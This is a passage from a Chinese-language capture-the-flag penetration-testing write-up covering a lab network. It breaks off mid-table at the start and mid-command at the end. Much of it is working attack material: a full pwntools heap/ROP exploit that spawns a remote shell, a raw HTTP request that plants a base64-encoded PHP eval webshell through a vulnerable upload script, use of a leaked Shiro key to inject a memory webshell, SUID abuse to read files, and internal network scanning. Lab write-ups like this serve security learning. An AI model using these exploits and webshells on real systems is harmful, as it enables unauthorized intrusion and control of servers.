style=text-align:left>无标题页面（需进一步测试）</td><td style=text-align:left>待定</td><td style=text-align:left>-</td><td style=text-align:left>检查网站内容，确认是否存在隐藏漏洞</td></tr><tr><td style=text-align:left></td><td style=text-align:left>8080/HTTP (ThinkPHP)</td><td style=text-align:left>ThinkPHP 5.0.23</td><td style=text-align:left>ThinkPHP 5.0.23远程代码执行（RCE）</td><td style=text-align:left>严重</td><td style=text-align:left>直接获取服务器控制权</td><td style=text-align:left>立即升级ThinkPHP或禁用该端口</td></tr></tbody></table><h1 id=flag03>flag03</h1><p>先对33分析一下，扫描一下内容</p><p><img alt=2025-05-08101155 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-08101155.png></p><p>下载一下heapdump看一下内容</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>java -jar JDumpSpider-<span style=color:#ae81ff>1.1</span>-SNAPSHOT-full.jar C:\Users\0raN9e\Desktop\春秋云镜\heapdump
</span></span></code></pre></div><p><img alt=2025-05-08101457 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-08101457.png></p><pre tabindex=0><code>===========================================
CookieRememberMeManager(ShiroKey)
-------------
algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES

===========================================
</code></pre><p>写一个shiro内存马进去</p><p><img alt=2025-05-08140459 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-08140459.png></p><p>看了一下不是root权限</p><p><img alt=2025-05-0841231 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-08141231.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/home/ops01 &gt;ls
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HashNote
</span></span></code></pre></div><p>下载下来分析一下</p><p>是一个pwn题，不会pwn直接用网上的脚本跑一下吧</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/ &gt;netstat -antlp
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Active Internet connections <span style=color:#f92672>(</span>servers and established<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:59696           0.0.0.0:*               LISTEN      -                   
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 172.28.23.33:58428      100.100.0.3:80          TIME_WAIT   -                   
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 172.28.23.33:50218      100.100.145.133:80      TIME_WAIT   -                   
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 172.28.23.33:46490      100.100.145.133:80      TIME_WAIT   -                   
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 172.28.23.33:59764      100.100.145.133:80      TIME_WAIT   -                   
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 172.28.23.33:53762      100.100.30.25:80        ESTABLISHED -                   
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 172.28.23.33:57550      100.100.145.133:80      TIME_WAIT   -                   
</span></span><span style=display:flex><span>tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::8080                 :::*                    LISTEN      667/java            
</span></span><span style=display:flex><span>tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 172.28.23.33:8080       172.28.23.17:60456      ESTABLISHED 667/java            
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>Not all processes could be identified, non-owned process info
</span></span><span style=display:flex><span> will not be shown, you would have to be root to see it all.<span style=color:#f92672>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>add</span>(key,data<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;b&#39;</span>):
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Option:&#39;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Key:&#39;</span>,key)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Data:&#39;</span>,data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>show</span>(key):
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Option:&#39;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;Key: &#34;</span>,key);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>edit</span>(key,data):
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Option:&#39;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Key:&#39;</span>,key)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Data:&#39;</span>,data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>name</span>(username):
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Option:&#39;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;4&#39;</span>)
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;name:&#39;</span>,username)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#39;172.28.23.33&#39;</span>, <span style=color:#ae81ff>59696</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># p = process(&#39;./HashNote&#39;)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>username<span style=color:#f92672>=</span><span style=color:#ae81ff>0x5dc980</span>
</span></span><span style=display:flex><span>stack<span style=color:#f92672>=</span><span style=color:#ae81ff>0x5e4fa8</span>
</span></span><span style=display:flex><span>ukey<span style=color:#f92672>=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x30</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>5</span><span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x31</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x44</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>fake_chunk<span style=color:#f92672>=</span>flat({
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0</span>:username<span style=color:#f92672>+</span><span style=color:#ae81ff>0x10</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x10</span>:[username<span style=color:#f92672>+</span><span style=color:#ae81ff>0x20</span>,len(ukey),\
</span></span><span style=display:flex><span>        ukey,<span style=color:#ae81ff>0</span>],
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x30</span>:[stack,<span style=color:#ae81ff>0x10</span>]
</span></span><span style=display:flex><span>    },filler<span style=color:#f92672>=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;name&#39;</span>,fake_chunk)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;word&#39;</span>,<span style=color:#e6db74>&#39;freep@ssw0rd:3&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x30</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>1</span><span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x31</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x44</span><span style=color:#e6db74>&#39;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;test&#39;</span>)   <span style=color:#75715e># 126</span>
</span></span><span style=display:flex><span>add(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x30</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>2</span><span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x31</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>+</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x44</span><span style=color:#e6db74>&#39;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;test&#39;</span>)   <span style=color:#75715e># 127</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>show(ukey)
</span></span><span style=display:flex><span>main_ret<span style=color:#f92672>=</span>u64(p<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>8</span>))<span style=color:#f92672>-</span><span style=color:#ae81ff>0x1e0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rdi<span style=color:#f92672>=</span><span style=color:#ae81ff>0x0000000000405e7c</span> <span style=color:#75715e># pop rdi ; ret</span>
</span></span><span style=display:flex><span>rsi<span style=color:#f92672>=</span><span style=color:#ae81ff>0x000000000040974f</span> <span style=color:#75715e># pop rsi ; ret</span>
</span></span><span style=display:flex><span>rdx<span style=color:#f92672>=</span><span style=color:#ae81ff>0x000000000053514b</span> <span style=color:#75715e># pop rdx ; pop rbx ; ret</span>
</span></span><span style=display:flex><span>rax<span style=color:#f92672>=</span><span style=color:#ae81ff>0x00000000004206ba</span> <span style=color:#75715e># pop rax ; ret</span>
</span></span><span style=display:flex><span>syscall<span style=color:#f92672>=</span><span style=color:#ae81ff>0x00000000004560c6</span> <span style=color:#75715e># syscall</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>fake_chunk<span style=color:#f92672>=</span>flat({
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0</span>:username<span style=color:#f92672>+</span><span style=color:#ae81ff>0x20</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x20</span>:[username<span style=color:#f92672>+</span><span style=color:#ae81ff>0x30</span>,len(ukey),\
</span></span><span style=display:flex><span>        ukey,<span style=color:#ae81ff>0</span>],
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>0x40</span>:[main_ret,<span style=color:#ae81ff>0x100</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>]
</span></span><span style=display:flex><span>    },filler<span style=color:#f92672>=</span><span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>name(fake_chunk<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x80</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload<span style=color:#f92672>=</span>flat([
</span></span><span style=display:flex><span>    rdi,username<span style=color:#f92672>+</span><span style=color:#ae81ff>0x50</span>,
</span></span><span style=display:flex><span>    rsi,<span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    rdx,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    rax,<span style=color:#ae81ff>0x3b</span>,
</span></span><span style=display:flex><span>    syscall
</span></span><span style=display:flex><span>    ])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Option:&#39;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Key:&#39;</span>,ukey)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(payload)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Option:&#39;</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;9&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div><p><img alt="Screenshot 2025-05-08 142915" loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-08142915.png></p><pre tabindex=0><code>flag03: flag{6a326f94-6526-4586-8233-152d137281fd}
</code></pre><h1 id=flag02>flag02</h1><p>直接匿名登录</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─# proxychains4 ftp 172.28.23.26   
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>proxychains<span style=color:#f92672>]</span> config file found: /etc/proxychains4.conf
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>proxychains<span style=color:#f92672>]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>proxychains<span style=color:#f92672>]</span> DLL init: proxychains-ng 4.17
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>proxychains<span style=color:#f92672>]</span> Dynamic chain  ...  27.25.151.99:6000  ...  172.28.23.26:21  ...  OK
</span></span><span style=display:flex><span>Connected to 172.28.23.26.
</span></span><span style=display:flex><span><span style=color:#ae81ff>220</span> <span style=color:#f92672>(</span>vsFTPd 3.0.3<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Name <span style=color:#f92672>(</span>172.28.23.26:orange<span style=color:#f92672>)</span>: anonymous
</span></span><span style=display:flex><span><span style=color:#ae81ff>331</span> Please specify the password.
</span></span><span style=display:flex><span>Password: 
</span></span><span style=display:flex><span><span style=color:#ae81ff>230</span> Login successful.
</span></span><span style=display:flex><span>Remote system type is UNIX.
</span></span><span style=display:flex><span>Using binary mode to transfer files.
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ftp&gt; dir
</span></span><span style=display:flex><span><span style=color:#ae81ff>229</span> Entering Extended Passive Mode <span style=color:#f92672>(||</span>|53964|<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>proxychains<span style=color:#f92672>]</span> Dynamic chain  ...  27.25.151.99:6000  ...  172.28.23.26:53964  ...  OK
</span></span><span style=display:flex><span><span style=color:#ae81ff>150</span> Here comes the directory listing.
</span></span><span style=display:flex><span>-rw-r--r--    <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>0</span>        <span style=color:#ae81ff>0</span>         <span style=color:#ae81ff>7536672</span> Mar <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2024</span> OASystem.zip
</span></span><span style=display:flex><span>get OASystem.zip
</span></span></code></pre></div><p>解压分析一下内容</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#e6db74>/**
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * Description: PhpStorm.
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * Author: yoby
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * DateTime: 2018/12/4 18:01
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * Email:logove@qq.com
</span></span></span><span style=display:flex><span><span style=color:#e6db74> * Copyright Yoby版权所有
</span></span></span><span style=display:flex><span><span style=color:#e6db74> */</span>
</span></span><span style=display:flex><span>$img <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;imgbase64&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/^(data:\s*image\/(\w+);base64,)/&#39;</span>, $img, $result)) {
</span></span><span style=display:flex><span>    $type <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;.&#34;</span><span style=color:#f92672>.</span>$result[<span style=color:#ae81ff>2</span>];
</span></span><span style=display:flex><span>    $path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;upload/&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>date</span>(<span style=color:#e6db74>&#34;Y-m-d&#34;</span>) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;-&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>uniqid</span>() <span style=color:#f92672>.</span> $type;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$img <span style=color:#f92672>=</span>  <span style=color:#a6e22e>base64_decode</span>(<span style=color:#a6e22e>str_replace</span>($result[<span style=color:#ae81ff>1</span>], <span style=color:#e6db74>&#39;&#39;</span>, $img));
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#a6e22e>file_put_contents</span>($path, $img);
</span></span><span style=display:flex><span><span style=color:#66d9ef>exit</span>(<span style=color:#e6db74>&#39;{&#34;src&#34;:&#34;&#39;</span><span style=color:#f92672>.</span>$path<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;&#34;}&#39;</span>);
</span></span></code></pre></div><p>根目录有<code>uploadbase64.php</code>，会匹配<code>data:image/&lt;input1>;base64,&lt;input2></code>，以<code>&lt;input1></code>作为文件后缀，<code>base64_decode(&lt;input2>）</code>作为文件内容写入</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /uploadbase64.php HTTP/1.1
</span></span><span style=display:flex><span>Host: 172.28.23.26
</span></span><span style=display:flex><span>Pragma: no-cache
</span></span><span style=display:flex><span>Cache-Control: no-cache
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>76</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>imgbase64<span style=color:#f92672>=</span>data:image/php;base64,PD89YCRfR0VUWzFdYDtldmFsKCRfUE9TVFsxXSk7Pz4<span style=color:#f92672>=</span>
</span></span></code></pre></div><p><img alt="Screenshot 2025-05-08 143918" loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-08143918.png></p><p>写入命令发现<img alt="Screenshot 2025-05-08 144047" loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-08144047.png>回显是ret=127</p><p>尝试蚁剑插件提权LD可以进行提权，修改一下<code>.antproxy.php</code>第31行的包含文件，加一个upload目录，然后把文件改一下，这里好像只支持GET的传参，在前端进行命令执行，为<code>www-data</code></p><p>执行提权<code>find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;</code></p><p><img alt="Screenshot 2025-05-08 145556" loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-08145556.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>30800</span> Jul <span style=color:#ae81ff>12</span>  <span style=color:#ae81ff>2016</span> /bin/fusermount
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44680</span> May  <span style=color:#ae81ff>8</span>  <span style=color:#ae81ff>2014</span> /bin/ping6
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>40152</span> Jan <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2020</span> /bin/mount
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>40128</span> Aug <span style=color:#ae81ff>31</span>  <span style=color:#ae81ff>2019</span> /bin/su
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44168</span> May  <span style=color:#ae81ff>8</span>  <span style=color:#ae81ff>2014</span> /bin/ping
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>27608</span> Jan <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2020</span> /bin/umount
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>71824</span> Aug <span style=color:#ae81ff>31</span>  <span style=color:#ae81ff>2019</span> /usr/bin/chfn
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>39904</span> Aug <span style=color:#ae81ff>31</span>  <span style=color:#ae81ff>2019</span> /usr/bin/newgrp
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>75304</span> Aug <span style=color:#ae81ff>31</span>  <span style=color:#ae81ff>2019</span> /usr/bin/gpasswd
</span></span><span style=display:flex><span>-rwsr-sr-x <span style=color:#ae81ff>1</span> daemon daemon <span style=color:#ae81ff>51464</span> Jan <span style=color:#ae81ff>15</span>  <span style=color:#ae81ff>2016</span> /usr/bin/at
</span></span><span style=display:flex><span>-rwsr-xr-- <span style=color:#ae81ff>1</span> root stapusr <span style=color:#ae81ff>173376</span> Apr  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2016</span> /usr/bin/staprun
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>39664</span> Mar  <span style=color:#ae81ff>3</span>  <span style=color:#ae81ff>2017</span> /usr/bin/base32
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>54256</span> Aug <span style=color:#ae81ff>31</span>  <span style=color:#ae81ff>2019</span> /usr/bin/passwd
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>40432</span> Aug <span style=color:#ae81ff>31</span>  <span style=color:#ae81ff>2019</span> /usr/bin/chsh
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>136808</span> Jan <span style=color:#ae81ff>21</span>  <span style=color:#ae81ff>2021</span> /usr/bin/sudo
</span></span><span style=display:flex><span>-rwsr-xr-- <span style=color:#ae81ff>1</span> root messagebus <span style=color:#ae81ff>42992</span> Jun <span style=color:#ae81ff>12</span>  <span style=color:#ae81ff>2020</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>428240</span> May <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2020</span> /usr/lib/openssh/ssh-keysign
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>10232</span> Mar <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2017</span> /usr/lib/eject/dmcrypt-get-device
</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>10104</span> Jan  <span style=color:#ae81ff>2</span>  <span style=color:#ae81ff>2016</span> /usr/lib/s-nail/s-nail-privsep
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://172.28.23.26/upload/.antproxy.php?1<span style=color:#f92672>=</span>system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;base32 /flag02.txt&#34;</span><span style=color:#f92672>)</span>;
</span></span></code></pre></div><p><img alt="Screenshot 2025-05-08 145503" loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-08145503.png></p><pre tabindex=0><code>flag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28}
</code></pre><p>看一下ifconfig的内容发现是有两个ip的，有二层</p><p><img alt=2025-05-19163656 loading=lazy src=/posts/%E6%B8%97%E9%80%8F/greatwall/2025-05-19163656.png></p><p>上传fscan扫一下内容</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>./fscan -h 172.22.14.0/24
